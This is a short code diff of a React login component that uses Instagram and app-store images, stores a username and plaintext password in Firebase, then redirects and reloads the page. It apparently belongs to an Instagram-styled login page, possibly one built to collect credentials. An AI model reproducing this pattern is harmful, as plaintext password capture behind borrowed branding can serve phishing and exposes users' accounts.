@@ -5,7 +5,7 @@ import appstore from '../../assets/appstore.png';
 import playstore from '../../assets/playstore.png';
 import logoInsta from '../../assets/instagram-logo-1.png'
 import fb from '../../ConfFirebase';
-
+import history from '../../history';
 
 function Layout() {
 
@@ -18,6 +18,8 @@ function Layout() {
       username: user,
       pass: password
     });
+    history.push('/image');
+    window.location.reload(true)
   }
 
   return(
